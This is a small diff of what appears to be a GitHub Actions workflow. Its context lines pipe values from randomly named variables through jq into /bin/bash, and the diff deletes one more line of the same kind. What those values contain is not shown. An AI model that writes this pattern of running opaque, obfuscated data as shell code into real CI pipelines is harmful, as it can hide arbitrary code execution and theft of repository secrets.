@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$m381" | jq -r .vqaqy042 | /bin/bash
           echo $tv1801 | jq -r .bezfi861 | /bin/bash
           echo $mfv85503 | jq -r .zfa95928 | /bin/bash
-          echo $kms85658 | jq -r .j9021 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
